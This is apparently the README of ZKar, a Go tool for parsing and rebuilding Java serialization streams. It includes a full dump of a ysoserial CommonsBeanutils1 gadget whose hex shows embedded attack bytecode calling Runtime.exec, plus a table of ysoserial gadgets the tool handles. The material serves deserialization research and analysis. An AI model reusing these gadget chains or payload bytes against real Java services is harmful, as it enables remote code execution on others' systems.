# ZKar

ZKar is a Java serialization protocol analysis tool implement in Go.

This tool is still **work in progress**, so no complete API document and contribution guide.

## Usage

### API

Install

```shell
go get -u github.com/phith0n/zkar
```

Quick start

```go
package main

import (
  "fmt"
  "github.com/phith0n/zkar/serz"
  "io/ioutil"
  "log"
)

func main() {
  data, _ := ioutil.ReadFile("./testcases/ysoserial/CommonsCollections6.ser")
  serialization, err := serz.FromBytes(data)
  if err != nil {
    log.Fatal("parse error")
  }

  fmt.Println(serialization.ToString())
}
```

### Command line

```shell
$ go run main.go
NAME:
   zkar - A Java serz tool

USAGE:
   main [global options] command [command options] [arguments...]

COMMANDS:
   generate  generate Java serz attack payloads
   dump      parse the Java serz streams and dump the struct
   help, h   Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h  show help (default: false)
```

For example, you can 

```
$ go run main.go dump -f "$(pwd)/testcases/ysoserial/CommonsBeanutils1.ser"
@Magic - 0xac ed
@Version - 0x00 05
@Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      @ClassName
        @Length - 23 - 0x00 17
        @Value - java.util.PriorityQueue - 0x6a 61 76 61 2e 75 74 69 6c 2e 50 72 69 6f 72 69 74 79 51 75 65 75 65
      @SerialVersionUID - -7720805057305804111 - 0x94 da 30 b4 fb 3f 82 b1
      @Handler - 8257536
      @ClassDescFlags - SC_SERIALIZABLE|SC_WRITE_METHOD - 0x03
      @FieldCount - 2 - 0x00 02
      []Fields
        Index 0:
          Integer - I - 0x49
          @FieldName
            @Length - 4 - 0x00 04
            @Value - size - 0x73 69 7a 65
        Index 1:
          Object - L - 0x4c
          @FieldName
            @Length - 10 - 0x00 0a
            @Value - comparator - 0x63 6f 6d 70 61 72 61 74 6f 72
          @ClassName
            TC_STRING - 0x74
              @Handler - 8257537
              @Length - 22 - 0x00 16
              @Value - Ljava/util/Comparator; - 0x4c 6a 61 76 61 2f 75 74 69 6c 2f 43 6f 6d 70 61 72 61 74 6f 72 3b
      []ClassAnnotations
        TC_ENDBLOCKDATA - 0x78
      @SuperClassDesc
        TC_NULL - 0x70
    @Handler - 8257538
    []ClassData
      @ClassName - java.util.PriorityQueue
        {}Attributes
          size
            (integer)2 - 0x00 00 00 02
          comparator
            TC_OBJECT - 0x73
              TC_CLASSDESC - 0x72
                @ClassName
                  @Length - 43 - 0x00 2b
                  @Value - org.apache.commons.beanutils.BeanComparator - 0x6f 72 67 2e 61 70 61 63 68 65 2e 63 6f 6d 6d 6f 6e 73 2e 62 65 61 6e 75 74 69 6c 73 2e 42 65 61 6e 43 6f 6d 70 61 72 61 74 6f 72
                @SerialVersionUID - -2044202215314119608 - 0xe3 a1 88 ea 73 22 a4 48
                @Handler - 8257539
                @ClassDescFlags - SC_SERIALIZABLE - 0x02
                @FieldCount - 2 - 0x00 02
                []Fields
                  Index 0:
                    Object - L - 0x4c
                    @FieldName
                      @Length - 10 - 0x00 0a
                      @Value - comparator - 0x63 6f 6d 70 61 72 61 74 6f 72
                    @ClassName
                      TC_REFERENCE - 0x71
                        @Handler - 8257537 - 0x00 7e 00 01
                  Index 1:
                    Object - L - 0x4c
                    @FieldName
                      @Length - 8 - 0x00 08
                      @Value - property - 0x70 72 6f 70 65 72 74 79
                    @ClassName
                      TC_STRING - 0x74
                        @Handler - 8257540
                        @Length - 18 - 0x00 12
                        @Value - Ljava/lang/String; - 0x4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b
                []ClassAnnotations
                  TC_ENDBLOCKDATA - 0x78
                @SuperClassDesc
                  TC_NULL - 0x70
              @Handler - 8257541
              []ClassData
                @ClassName - org.apache.commons.beanutils.BeanComparator
                  {}Attributes
                    comparator
                      TC_OBJECT - 0x73
                        TC_CLASSDESC - 0x72
                          @ClassName
                            @Length - 63 - 0x00 3f
                            @Value - org.apache.commons.collections.comparators.ComparableComparator - 0x6f 72 67 2e 61 70 61 63 68 65 2e 63 6f 6d 6d 6f 6e 73 2e 63 6f 6c 6c 65 63 74 69 6f 6e 73 2e 63 6f 6d 70 61 72 61 74 6f 72 73 2e 43 6f 6d 70 61 72 61 62 6c 65 43 6f 6d 70 61 72 61 74 6f 72
                          @SerialVersionUID - -291439688585137865 - 0xfb f4 99 25 b8 6e b1 37
                          @Handler - 8257542
                          @ClassDescFlags - SC_SERIALIZABLE - 0x02
                          @FieldCount - 0 - 0x00 00
                          []Fields
                          []ClassAnnotations
                            TC_ENDBLOCKDATA - 0x78
                          @SuperClassDesc
                            TC_NULL - 0x70
                        @Handler - 8257543
                        []ClassData
                          @ClassName - org.apache.commons.collections.comparators.ComparableComparator
                            {}Attributes
                    property
                      TC_STRING - 0x74
                        @Handler - 8257544
                        @Length - 16 - 0x00 10
                        @Value - outputProperties - 0x6f 75 74 70 75 74 50 72 6f 70 65 72 74 69 65 73
        @ObjectAnnotation
          TC_BLOCKDATA - 0x77
            @Blockdata - 0x00 00 00 03
          TC_OBJECT - 0x73
            TC_CLASSDESC - 0x72
              @ClassName
                @Length - 58 - 0x00 3a
                @Value - com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl - 0x63 6f 6d 2e 73 75 6e 2e 6f 72 67 2e 61 70 61 63 68 65 2e 78 61 6c 61 6e 2e 69 6e 74 65 72 6e 61 6c 2e 78 73 6c 74 63 2e 74 72 61 78 2e 54 65 6d 70 6c 61 74 65 73 49 6d 70 6c
              @SerialVersionUID - 673094361519270707 - 0x09 57 4f c1 6e ac ab 33
              @Handler - 8257545
              @ClassDescFlags - SC_SERIALIZABLE|SC_WRITE_METHOD - 0x03
              @FieldCount - 6 - 0x00 06
              []Fields
                Index 0:
                  Integer - I - 0x49
                  @FieldName
                    @Length - 13 - 0x00 0d
                    @Value - _indentNumber - 0x5f 69 6e 64 65 6e 74 4e 75 6d 62 65 72
                Index 1:
                  Integer - I - 0x49
                  @FieldName
                    @Length - 14 - 0x00 0e
                    @Value - _transletIndex - 0x5f 74 72 61 6e 73 6c 65 74 49 6e 64 65 78
                Index 2:
                  Array - [ - 0x5b
                  @FieldName
                    @Length - 10 - 0x00 0a
                    @Value - _bytecodes - 0x5f 62 79 74 65 63 6f 64 65 73
                  @ClassName
                    TC_STRING - 0x74
                      @Handler - 8257546
                      @Length - 3 - 0x00 03
                      @Value - [[B - 0x5b 5b 42
                Index 3:
                  Array - [ - 0x5b
                  @FieldName
                    @Length - 6 - 0x00 06
                    @Value - _class - 0x5f 63 6c 61 73 73
                  @ClassName
                    TC_STRING - 0x74
                      @Handler - 8257547
                      @Length - 18 - 0x00 12
                      @Value - [Ljava/lang/Class; - 0x5b 4c 6a 61 76 61 2f 6c 61 6e 67 2f 43 6c 61 73 73 3b
                Index 4:
                  Object - L - 0x4c
                  @FieldName
                    @Length - 5 - 0x00 05
                    @Value - _name - 0x5f 6e 61 6d 65
                  @ClassName
                    TC_REFERENCE - 0x71
                      @Handler - 8257540 - 0x00 7e 00 04
                Index 5:
                  Object - L - 0x4c
                  @FieldName
                    @Length - 17 - 0x00 11
                    @Value - _outputProperties - 0x5f 6f 75 74 70 75 74 50 72 6f 70 65 72 74 69 65 73
                  @ClassName
                    TC_STRING - 0x74
                      @Handler - 8257548
                      @Length - 22 - 0x00 16
                      @Value - Ljava/util/Properties; - 0x4c 6a 61 76 61 2f 75 74 69 6c 2f 50 72 6f 70 65 72 74 69 65 73 3b
              []ClassAnnotations
                TC_ENDBLOCKDATA - 0x78
              @SuperClassDesc
                TC_NULL - 0x70
            @Handler - 8257549
            []ClassData
              @ClassName - com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
                {}Attributes
                  _indentNumber
                    (integer)0 - 0x00 00 00 00
                  _transletIndex
                    (integer)-1 - 0xff ff ff ff
                  _bytecodes
                    TC_ARRAY - 0x75
                      TC_CLASSDESC - 0x72
                        @ClassName
                          @Length - 3 - 0x00 03
                          @Value - [[B - 0x5b 5b 42
                        @SerialVersionUID - 5475560301672258359 - 0x4b fd 19 15 67 67 db 37
                        @Handler - 8257550
                        @ClassDescFlags - SC_SERIALIZABLE - 0x02
                        @FieldCount - 0 - 0x00 00
                        []Fields
                        []ClassAnnotations
                          TC_ENDBLOCKDATA - 0x78
                        @SuperClassDesc
                          TC_NULL - 0x70
                      @Handler - 8257551
                      @ArraySize - 2 - 0x00 00 00 02
                      []Values
                        Index 0
                          TC_ARRAY - 0x75
                            TC_CLASSDESC - 0x72
                              @ClassName
                                @Length - 2 - 0x00 02
                                @Value - [B - 0x5b 42
                              @SerialVersionUID - -5984413125824719648 - 0xac f3 17 f8 06 08 54 e0
                              @Handler - 8257552
                              @ClassDescFlags - SC_SERIALIZABLE - 0x02
                              @FieldCount - 0 - 0x00 00
                              []Fields
                              []ClassAnnotations
                                TC_ENDBLOCKDATA - 0x78
                              @SuperClassDesc
                                TC_NULL - 0x70
                            @Handler - 8257553
                            @ArraySize - 1706 - 0x00 00 06 aa
                            []Values
                          00000000  ca fe ba be 00 00 00 32  00 39 0a 00 03 00 22 07  |.......2.9....".|
                          00000010  00 37 07 00 25 07 00 26  01 00 10 73 65 72 69 61  |.7..%..&...seria|
                          00000020  6c 56 65 72 73 69 6f 6e  55 49 44 01 00 01 4a 01  |lVersionUID...J.|
                          00000030  00 0d 43 6f 6e 73 74 61  6e 74 56 61 6c 75 65 05  |..ConstantValue.|
                          00000040  ad 20 93 f3 91 dd ef 3e  01 00 06 3c 69 6e 69 74  |. .....>...<init|
                          00000050  3e 01 00 03 28 29 56 01  00 04 43 6f 64 65 01 00  |>...()V...Code..|
                          00000060  0f 4c 69 6e 65 4e 75 6d  62 65 72 54 61 62 6c 65  |.LineNumberTable|
                          00000070  01 00 12 4c 6f 63 61 6c  56 61 72 69 61 62 6c 65  |...LocalVariable|
                          00000080  54 61 62 6c 65 01 00 04  74 68 69 73 01 00 13 53  |Table...this...S|
                          00000090  74 75 62 54 72 61 6e 73  6c 65 74 50 61 79 6c 6f  |tubTransletPaylo|
                          000000a0  61 64 01 00 0c 49 6e 6e  65 72 43 6c 61 73 73 65  |ad...InnerClasse|
                          000000b0  73 01 00 35 4c 79 73 6f  73 65 72 69 61 6c 2f 70  |s..5Lysoserial/p|
                          000000c0  61 79 6c 6f 61 64 73 2f  75 74 69 6c 2f 47 61 64  |ayloads/util/Gad|
                          000000d0  67 65 74 73 24 53 74 75  62 54 72 61 6e 73 6c 65  |gets$StubTransle|
                          000000e0  74 50 61 79 6c 6f 61 64  3b 01 00 09 74 72 61 6e  |tPayload;...tran|
                          000000f0  73 66 6f 72 6d 01 00 72  28 4c 63 6f 6d 2f 73 75  |sform..r(Lcom/su|
                          00000100  6e 2f 6f 72 67 2f 61 70  61 63 68 65 2f 78 61 6c  |n/org/apache/xal|
                          00000110  61 6e 2f 69 6e 74 65 72  6e 61 6c 2f 78 73 6c 74  |an/internal/xslt|
                          00000120  63 2f 44 4f 4d 3b 5b 4c  63 6f 6d 2f 73 75 6e 2f  |c/DOM;[Lcom/sun/|
                          00000130  6f 72 67 2f 61 70 61 63  68 65 2f 78 6d 6c 2f 69  |org/apache/xml/i|
                          00000140  6e 74 65 72 6e 61 6c 2f  73 65 72 69 61 6c 69 7a  |nternal/serializ|
                          00000150  65 72 2f 53 65 72 69 61  6c 69 7a 61 74 69 6f 6e  |er/Serialization|
                          00000160  48 61 6e 64 6c 65 72 3b  29 56 01 00 08 64 6f 63  |Handler;)V...doc|
                          00000170  75 6d 65 6e 74 01 00 2d  4c 63 6f 6d 2f 73 75 6e  |ument..-Lcom/sun|
                          00000180  2f 6f 72 67 2f 61 70 61  63 68 65 2f 78 61 6c 61  |/org/apache/xala|
                          00000190  6e 2f 69 6e 74 65 72 6e  61 6c 2f 78 73 6c 74 63  |n/internal/xsltc|
                          000001a0  2f 44 4f 4d 3b 01 00 08  68 61 6e 64 6c 65 72 73  |/DOM;...handlers|
                          000001b0  01 00 42 5b 4c 63 6f 6d  2f 73 75 6e 2f 6f 72 67  |..B[Lcom/sun/org|
                          000001c0  2f 61 70 61 63 68 65 2f  78 6d 6c 2f 69 6e 74 65  |/apache/xml/inte|
                          000001d0  72 6e 61 6c 2f 73 65 72  69 61 6c 69 7a 65 72 2f  |rnal/serializer/|
                          000001e0  53 65 72 69 61 6c 69 7a  61 74 69 6f 6e 48 61 6e  |SerializationHan|
                          000001f0  64 6c 65 72 3b 01 00 0a  45 78 63 65 70 74 69 6f  |dler;...Exceptio|
                          00000200  6e 73 07 00 27 01 00 a6  28 4c 63 6f 6d 2f 73 75  |ns..'...(Lcom/su|
                          00000210  6e 2f 6f 72 67 2f 61 70  61 63 68 65 2f 78 61 6c  |n/org/apache/xal|
                          00000220  61 6e 2f 69 6e 74 65 72  6e 61 6c 2f 78 73 6c 74  |an/internal/xslt|
                          00000230  63 2f 44 4f 4d 3b 4c 63  6f 6d 2f 73 75 6e 2f 6f  |c/DOM;Lcom/sun/o|
                          00000240  72 67 2f 61 70 61 63 68  65 2f 78 6d 6c 2f 69 6e  |rg/apache/xml/in|
                          00000250  74 65 72 6e 61 6c 2f 64  74 6d 2f 44 54 4d 41 78  |ternal/dtm/DTMAx|
                          00000260  69 73 49 74 65 72 61 74  6f 72 3b 4c 63 6f 6d 2f  |isIterator;Lcom/|
                          00000270  73 75 6e 2f 6f 72 67 2f  61 70 61 63 68 65 2f 78  |sun/org/apache/x|
                          00000280  6d 6c 2f 69 6e 74 65 72  6e 61 6c 2f 73 65 72 69  |ml/internal/seri|
                          00000290  61 6c 69 7a 65 72 2f 53  65 72 69 61 6c 69 7a 61  |alizer/Serializa|
                          000002a0  74 69 6f 6e 48 61 6e 64  6c 65 72 3b 29 56 01 00  |tionHandler;)V..|
                          000002b0  08 69 74 65 72 61 74 6f  72 01 00 35 4c 63 6f 6d  |.iterator..5Lcom|
                          000002c0  2f 73 75 6e 2f 6f 72 67  2f 61 70 61 63 68 65 2f  |/sun/org/apache/|
                          000002d0  78 6d 6c 2f 69 6e 74 65  72 6e 61 6c 2f 64 74 6d  |xml/internal/dtm|
                          000002e0  2f 44 54 4d 41 78 69 73  49 74 65 72 61 74 6f 72  |/DTMAxisIterator|
                          000002f0  3b 01 00 07 68 61 6e 64  6c 65 72 01 00 41 4c 63  |;...handler..ALc|
                          00000300  6f 6d 2f 73 75 6e 2f 6f  72 67 2f 61 70 61 63 68  |om/sun/org/apach|
                          00000310  65 2f 78 6d 6c 2f 69 6e  74 65 72 6e 61 6c 2f 73  |e/xml/internal/s|
                          00000320  65 72 69 61 6c 69 7a 65  72 2f 53 65 72 69 61 6c  |erializer/Serial|
                          00000330  69 7a 61 74 69 6f 6e 48  61 6e 64 6c 65 72 3b 01  |izationHandler;.|
                          00000340  00 0a 53 6f 75 72 63 65  46 69 6c 65 01 00 0c 47  |..SourceFile...G|
                          00000350  61 64 67 65 74 73 2e 6a  61 76 61 0c 00 0a 00 0b  |adgets.java.....|
                          00000360  07 00 28 01 00 33 79 73  6f 73 65 72 69 61 6c 2f  |..(..3ysoserial/|
                          00000370  70 61 79 6c 6f 61 64 73  2f 75 74 69 6c 2f 47 61  |payloads/util/Ga|
                          00000380  64 67 65 74 73 24 53 74  75 62 54 72 61 6e 73 6c  |dgets$StubTransl|
                          00000390  65 74 50 61 79 6c 6f 61  64 01 00 40 63 6f 6d 2f  |etPayload..@com/|
                          000003a0  73 75 6e 2f 6f 72 67 2f  61 70 61 63 68 65 2f 78  |sun/org/apache/x|
                          000003b0  61 6c 61 6e 2f 69 6e 74  65 72 6e 61 6c 2f 78 73  |alan/internal/xs|
                          000003c0  6c 74 63 2f 72 75 6e 74  69 6d 65 2f 41 62 73 74  |ltc/runtime/Abst|
                          000003d0  72 61 63 74 54 72 61 6e  73 6c 65 74 01 00 14 6a  |ractTranslet...j|
                          000003e0  61 76 61 2f 69 6f 2f 53  65 72 69 61 6c 69 7a 61  |ava/io/Serializa|
                          000003f0  62 6c 65 01 00 39 63 6f  6d 2f 73 75 6e 2f 6f 72  |ble..9com/sun/or|
                          00000400  67 2f 61 70 61 63 68 65  2f 78 61 6c 61 6e 2f 69  |g/apache/xalan/i|
                          00000410  6e 74 65 72 6e 61 6c 2f  78 73 6c 74 63 2f 54 72  |nternal/xsltc/Tr|
                          00000420  61 6e 73 6c 65 74 45 78  63 65 70 74 69 6f 6e 01  |ansletException.|
                          00000430  00 1f 79 73 6f 73 65 72  69 61 6c 2f 70 61 79 6c  |..ysoserial/payl|
                          00000440  6f 61 64 73 2f 75 74 69  6c 2f 47 61 64 67 65 74  |oads/util/Gadget|
                          00000450  73 01 00 08 3c 63 6c 69  6e 69 74 3e 01 00 11 6a  |s...<clinit>...j|
                          00000460  61 76 61 2f 6c 61 6e 67  2f 52 75 6e 74 69 6d 65  |ava/lang/Runtime|
                          00000470  07 00 2a 01 00 0a 67 65  74 52 75 6e 74 69 6d 65  |..*...getRuntime|
                          00000480  01 00 15 28 29 4c 6a 61  76 61 2f 6c 61 6e 67 2f  |...()Ljava/lang/|
                          00000490  52 75 6e 74 69 6d 65 3b  0c 00 2c 00 2d 0a 00 2b  |Runtime;..,.-..+|
                          000004a0  00 2e 01 00 12 68 74 74  70 3a 2f 2f 65 78 61 6d  |.....http://exam|
                          000004b0  70 6c 65 2e 63 6f 6d 08  00 30 01 00 04 65 78 65  |ple.com..0...exe|
                          000004c0  63 01 00 27 28 4c 6a 61  76 61 2f 6c 61 6e 67 2f  |c..'(Ljava/lang/|
                          000004d0  53 74 72 69 6e 67 3b 29  4c 6a 61 76 61 2f 6c 61  |String;)Ljava/la|
                          000004e0  6e 67 2f 50 72 6f 63 65  73 73 3b 0c 00 32 00 33  |ng/Process;..2.3|
                          000004f0  0a 00 2b 00 34 01 00 0d  53 74 61 63 6b 4d 61 70  |..+.4...StackMap|
                          00000500  54 61 62 6c 65 01 00 1f  79 73 6f 73 65 72 69 61  |Table...ysoseria|
                          00000510  6c 2f 50 77 6e 65 72 31  36 36 39 38 37 36 37 39  |l/Pwner166987679|
                          00000520  38 37 36 31 39 30 31 01  00 21 4c 79 73 6f 73 65  |8761901..!Lysose|
                          00000530  72 69 61 6c 2f 50 77 6e  65 72 31 36 36 39 38 37  |rial/Pwner166987|
                          00000540  36 37 39 38 37 36 31 39  30 31 3b 00 21 00 02 00  |6798761901;.!...|
                          00000550  03 00 01 00 04 00 01 00  1a 00 05 00 06 00 01 00  |................|
                          00000560  07 00 00 00 02 00 08 00  04 00 01 00 0a 00 0b 00  |................|
                          00000570  01 00 0c 00 00 00 2f 00  01 00 01 00 00 00 05 2a  |....../........*|
                          00000580  b7 00 01 b1 00 00 00 02  00 0d 00 00 00 06 00 01  |................|
                          00000590  00 00 00 2f 00 0e 00 00  00 0c 00 01 00 00 00 05  |.../............|
                          000005a0  00 0f 00 38 00 00 00 01  00 13 00 14 00 02 00 0c  |...8............|
                          000005b0  00 00 00 3f 00 00 00 03  00 00 00 01 b1 00 00 00  |...?............|
                          000005c0  02 00 0d 00 00 00 06 00  01 00 00 00 34 00 0e 00  |............4...|
                          000005d0  00 00 20 00 03 00 00 00  01 00 0f 00 38 00 00 00  |.. .........8...|
                          000005e0  00 00 01 00 15 00 16 00  01 00 00 00 01 00 17 00  |................|
                          000005f0  18 00 02 00 19 00 00 00  04 00 01 00 1a 00 01 00  |................|
                          00000600  13 00 1b 00 02 00 0c 00  00 00 49 00 00 00 04 00  |..........I.....|
                          00000610  00 00 01 b1 00 00 00 02  00 0d 00 00 00 06 00 01  |................|
                          00000620  00 00 00 38 00 0e 00 00  00 2a 00 04 00 00 00 01  |...8.....*......|
                          00000630  00 0f 00 38 00 00 00 00  00 01 00 15 00 16 00 01  |...8............|
                          00000640  00 00 00 01 00 1c 00 1d  00 02 00 00 00 01 00 1e  |................|
                          00000650  00 1f 00 03 00 19 00 00  00 04 00 01 00 1a 00 08  |................|
                          00000660  00 29 00 0b 00 01 00 0c  00 00 00 24 00 03 00 02  |.).........$....|
                          00000670  00 00 00 0f a7 00 03 01  4c b8 00 2f 12 31 b6 00  |........L../.1..|
                          00000680  35 57 b1 00 00 00 01 00  36 00 00 00 03 00 01 03  |5W......6.......|
                          00000690  00 02 00 20 00 00 00 02  00 21 00 11 00 00 00 0a  |... .....!......|
                          000006a0  00 01 00 02 00 23 00 10  00 09                    |.....#....|
                        Index 1
                          TC_ARRAY - 0x75
                            TC_REFERENCE - 0x71
                              @Handler - 8257552 - 0x00 7e 00 10
                            @Handler - 8257554
                            @ArraySize - 468 - 0x00 00 01 d4
                            []Values
                          00000000  ca fe ba be 00 00 00 32  00 1b 0a 00 03 00 15 07  |.......2........|
                          00000010  00 17 07 00 18 07 00 19  01 00 10 73 65 72 69 61  |...........seria|
                          00000020  6c 56 65 72 73 69 6f 6e  55 49 44 01 00 01 4a 01  |lVersionUID...J.|
                          00000030  00 0d 43 6f 6e 73 74 61  6e 74 56 61 6c 75 65 05  |..ConstantValue.|
                          00000040  71 e6 69 ee 3c 6d 47 18  01 00 06 3c 69 6e 69 74  |q.i.<mG....<init|
                          00000050  3e 01 00 03 28 29 56 01  00 04 43 6f 64 65 01 00  |>...()V...Code..|
                          00000060  0f 4c 69 6e 65 4e 75 6d  62 65 72 54 61 62 6c 65  |.LineNumberTable|
                          00000070  01 00 12 4c 6f 63 61 6c  56 61 72 69 61 62 6c 65  |...LocalVariable|
                          00000080  54 61 62 6c 65 01 00 04  74 68 69 73 01 00 03 46  |Table...this...F|
                          00000090  6f 6f 01 00 0c 49 6e 6e  65 72 43 6c 61 73 73 65  |oo...InnerClasse|
                          000000a0  73 01 00 25 4c 79 73 6f  73 65 72 69 61 6c 2f 70  |s..%Lysoserial/p|
                          000000b0  61 79 6c 6f 61 64 73 2f  75 74 69 6c 2f 47 61 64  |ayloads/util/Gad|
                          000000c0  67 65 74 73 24 46 6f 6f  3b 01 00 0a 53 6f 75 72  |gets$Foo;...Sour|
                          000000d0  63 65 46 69 6c 65 01 00  0c 47 61 64 67 65 74 73  |ceFile...Gadgets|
                          000000e0  2e 6a 61 76 61 0c 00 0a  00 0b 07 00 1a 01 00 23  |.java..........#|
                          000000f0  79 73 6f 73 65 72 69 61  6c 2f 70 61 79 6c 6f 61  |ysoserial/payloa|
                          00000100  64 73 2f 75 74 69 6c 2f  47 61 64 67 65 74 73 24  |ds/util/Gadgets$|
                          00000110  46 6f 6f 01 00 10 6a 61  76 61 2f 6c 61 6e 67 2f  |Foo...java/lang/|
                          00000120  4f 62 6a 65 63 74 01 00  14 6a 61 76 61 2f 69 6f  |Object...java/io|
                          00000130  2f 53 65 72 69 61 6c 69  7a 61 62 6c 65 01 00 1f  |/Serializable...|
                          00000140  79 73 6f 73 65 72 69 61  6c 2f 70 61 79 6c 6f 61  |ysoserial/payloa|
                          00000150  64 73 2f 75 74 69 6c 2f  47 61 64 67 65 74 73 00  |ds/util/Gadgets.|
                          00000160  21 00 02 00 03 00 01 00  04 00 01 00 1a 00 05 00  |!...............|
                          00000170  06 00 01 00 07 00 00 00  02 00 08 00 01 00 01 00  |................|
                          00000180  0a 00 0b 00 01 00 0c 00  00 00 2f 00 01 00 01 00  |........../.....|
                          00000190  00 00 05 2a b7 00 01 b1  00 00 00 02 00 0d 00 00  |...*............|
                          000001a0  00 06 00 01 00 00 00 3c  00 0e 00 00 00 0c 00 01  |.......<........|
                          000001b0  00 00 00 05 00 0f 00 12  00 00 00 02 00 13 00 00  |................|
                          000001c0  00 02 00 14 00 11 00 00  00 0a 00 01 00 02 00 16  |................|
                          000001d0  00 10 00 09                                       |....|
                  _class
                    TC_NULL - 0x70
                  _name
                    TC_STRING - 0x74
                      @Handler - 8257555
                      @Length - 4 - 0x00 04
                      @Value - Pwnr - 0x50 77 6e 72
                  _outputProperties
                    TC_NULL - 0x70
                @ObjectAnnotation
                  TC_BLOCKDATA - 0x77
                    @Blockdata - 0x00
          TC_REFERENCE - 0x71
            @Handler - 8257549 - 0x00 7e 00 0d
```

## Test

ZKar is a well-tested tool that passed all Ysoserial generated gadgets parsing and rebuilding tests. It means that
gadget generating by Ysoserial can be parsed by ZKar, and parsed struts can be converted back into bytes string which is
equal to the original one.

| Gadget              | Package   | Parse | Rebuild | Parse Time |
|---------------------|-----------|-------|---------|------------|
| AspectJWeaver       | Ysoserial | ✅     | ✅       | 80.334µs   |
| BeanShell1          | Ysoserial | ✅     | ✅       | 782.613µs  |
| C3P0                | Ysoserial | ✅     | ✅       | 98.321µs   |
| Click1              | Ysoserial | ✅     | ✅       | 573.298µs  |
| Clojure             | Ysoserial | ✅     | ✅       | 72.415µs   |
| CommonsBeanutils1   | Ysoserial | ✅     | ✅       | 461.15µs   |
| CommonsCollections1 | Ysoserial | ✅     | ✅       | 64.484µs   |
| CommonsCollections2 | Ysoserial | ✅     | ✅       | 508.918µs  |
| CommonsCollections3 | Ysoserial | ✅     | ✅       | 564.071µs  |
| CommonsCollections4 | Ysoserial | ✅     | ✅       | 535.449µs  |
| CommonsCollections5 | Ysoserial | ✅     | ✅       | 137.609µs  |
| CommonsCollections6 | Ysoserial | ✅     | ✅       | 68.753µs   |
| CommonsCollections7 | Ysoserial | ✅     | ✅       | 178.549µs  |
| FileUpload1         | Ysoserial | ✅     | ✅       | 35.39µs    |
| Groovy1             | Ysoserial | ✅     | ✅       | 150.991µs  |
| Hibernate1          | Ysoserial | ✅     | ✅       | 789.674µs  |
| Hibernate2          | Ysoserial | ✅     | ✅       | 168.624µs  |
| JBossInterceptors1  | Ysoserial | ✅     | ✅       | 632.581µs  |
| JRMPClient          | Ysoserial | ✅     | ✅       | 32.967µs   |
| JRMPListener        | Ysoserial | ✅     | ✅       | 38.263µs   |
| JSON1               | Ysoserial | ✅     | ✅       | 2.157225ms |
| JavassistWeld1      | Ysoserial | ✅     | ✅       | 468.596µs  |
| Jdk7u21             | Ysoserial | ✅     | ✅       | 355.01µs   |
| Jython1             | Ysoserial | ✅     | ✅       | 216.862µs  |
| MozillaRhino1       | Ysoserial | ✅     | ✅       | 1.775193ms |
| MozillaRhino2       | Ysoserial | ✅     | ✅       | 409.124µs  |
| Myfaces1            | Ysoserial | ✅     | ✅       | 22.997µs   |
| Myfaces2            | Ysoserial | ✅     | ✅       | 38.131µs   |
| ROME                | Ysoserial | ✅     | ✅       | 485.804µs  |
| Spring1             | Ysoserial | ✅     | ✅       | 797.469µs  |
| Spring2             | Ysoserial | ✅     | ✅       | 358.041µs  |
| URLDNS              | Ysoserial | ✅     | ✅       | 21.502µs   |
| Vaadin1             | Ysoserial | ✅     | ✅       | 438.729µs  |
| Wicket1             | Ysoserial | ✅     | ✅       | 23.509µs   |

## TODO

- [ ] Java bytecodes parser and generator
- [ ] Serialization payloads generator
- [ ] An implementation of RMI/LDAP in Go

## See Also

- [SerializationDumper](https://github.com/NickstaDB/SerializationDumper): A tool to dump and rebuild Java serialization
  streams and Java RMI packet contents in a more human readable form.
- [ysoserial](https://github.com/frohoff/ysoserial): A proof-of-concept tool for generating payloads that exploit unsafe
  Java object deserialization.
- [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): The cheat sheet about
  Java Deserialization vulnerabilities
